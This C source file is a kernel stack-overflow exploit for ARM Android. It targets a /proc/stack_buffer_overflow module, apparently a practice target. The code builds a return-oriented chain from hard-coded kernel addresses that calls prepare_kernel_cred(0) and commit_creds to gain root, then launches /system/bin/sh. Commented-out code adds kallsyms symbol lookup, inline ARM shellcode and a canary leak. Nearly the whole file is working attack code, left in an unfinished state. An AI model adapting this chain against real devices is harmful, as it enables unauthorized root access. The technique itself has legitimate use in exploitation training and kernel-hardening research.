#include <stdio.h>
#include <string.h>

#include <unistd.h>
#include <fcntl.h>

#include <sys/mman.h>

#define MAX  64

// void * prepare_kernel_cred;
// void * commit_creds;
// void * proc_file_write;


// void *
// get_ksymbol(char *name)
// {
//         FILE *f = fopen("/proc/kallsyms", "r");
//         char c, sym[512];
//         void *addr;
//         int ret;

//         while (fscanf(f, "%p %c %s\n", &addr, &c, sym) > 0) {
//                 if (!strcmp(sym, name))
//                         return addr;
//         }

//         return NULL;
// }

int
open_file(void)
{
        int fd = open("/proc/stack_buffer_overflow", O_RDWR);
        if (fd == -1)
                err(1, "open");
        return fd;
}

void
payload(void)
{
        // char *args[] = {"id"};
        
        if (getuid() == 0) {
                // printf("[+] enjoy the shell\n");
                write(1, "start\n", 6);
                // system("/system/bin/id");
                // execve("/system/bin/sh", args, NULL);
                execl("/system/bin/sh", "sh", NULL);
                write(1, "over\n", 5);
        } else {
                warnx("failed to get root. How did we even get here?");
        }

        _exit(0);
}



// extern uint32_t shellCode[];

// asm
// (
// "    .text\n"
// "    .align 2\n"
// "    .code 32\n"
// "    .globl shellCode\n\t"
// "shellCode:\n\t"


// // commit_creds(prepare_kernel_cred(0));
// // -> get root
// "LDR     R3, =0xc00430f0\n\t"
// "MOV     R0, #0\n\t"
// "BLX     R3\n\t"
// "LDR     R3, =0xc0042bf8\n\t"
// "BLX     R3\n\t"

// //Fix the trashed stack by restoring r4/r5 from duped values on the stack
// "ldr r0, =0xc029a574\t\n"
// "ldr r4, [sp] \t\n"
// "ldr r5, [sp, #4]\t\n"
// "bx r0\t\n"
// );


void
trigger_vuln(int fd, int canary)
{

        #define MAX_PAYLOAD (MAX + 2 * sizeof(void*) + 0x68)

        char buf[MAX_PAYLOAD];
        int i;

        memset(buf, 'B', sizeof(buf));
        // void *map_addr_tmp= mmap(0,0x10000,7,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
        // memset(map_addr_tmp, 'B', 0x100);                        
        // printf("0x%x\n", map_addr_tmp);
        int * pc = buf + MAX; //+ sizeof(void*);

        // *(void **)pc  = (void *) shellCode;
        *pc++ = 0xc011afac;
        // *pc++ = 0xc02b2688;
        // *pc++ = 0xc011afac;
        *pc++ = 0xC00B8D68;                       // ; mov r0, #0; pop {r4, pc}
        *pc++ = 0x41424344;                                // r4
        *pc++ = 0xC00430F4;                       // ; prepare_kernel_cred(0)     -> pop {r3-r5, pc}
        *pc++ = 0x41424344;                                // r3
        *pc++ = 0x41424344;                                // r4
        *pc++ = 0x41424344;                                // r5
        // *pc++ = 0xC00B8D6c;                       // ; pop {r4, pc}
        // *pc++ = 0x41424344;                                // r4
        *pc++ = 0xC0042BFC;                       // ; commit_creds   -> pop {r4-r6, pc}
        *pc++ = 0x170;                                // r4
        *pc++ = 0xc0026328;                                // r5
        *pc++ = 0x41424344;                                // r6
        *pc++ = 0xc032db48;                          // add sp, sp, #0x30; pop {r4, r5, r6, pc};
        *pc++ = 0x170;                                // r4
        *pc++ = 0xc0026328;                                // r5
        *pc++ = 0x41424344;                                // r6
        // *pc++ = 0xc01e8400;                       // pop	{r1, pc}
        // *pc++ = 0x170;                            // r1
        // *pc++ = 0xc000df94;                       // ; msr    SPSR_fsxc,  r1
        for (i=0; i < 13; i++) {
                *pc++  = 0xc000df90;        
        }
        // *pc++ = 0x170;
        
        // // *pc++ = 0;
        // *(void **)pc++  = (void *)0x82a8;
        /* Kaboom! */
        write(fd, buf, sizeof(buf) );
}

// int
// gather_information(int fd)
// {
//         int canary, i;

//         if (lseek(fd, 32, SEEK_SET) == -1)
//                 err(2, "lseek");
//         read(fd, &canary, sizeof(canary));

//         printf("[+] found canary: %08x\n", canary);

//         return canary;
// }

// void
// resolve_kernel_symbols(void)
// {
//         prepare_kernel_cred     = get_ksymbol("prepare_kernel_cred");
//         commit_creds            = get_ksymbol("commit_creds");
//         proc_file_write         = get_ksymbol("proc_file_write");

//         if (!prepare_kernel_cred || !commit_creds)
//                 errx(1, "couldn't map all kernel symbols");
// }

int
main(void)
{
        int fd, canary;

        // resolve_kernel_symbols();

        fd = open_file();
        // canary = gather_information(fd);
        canary = 0;
        trigger_vuln(fd, canary);
        // int test_address;
        // test_address = 0xd4150000;
        // printf("%p\n", *(char *)test_address);
        // void *map_addr_tmp= mmap(0,0x10000,7,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
        payload();
        /* If we're here, we've failed. */
        close(fd);

        errx("[-] exploit failed\n");
}
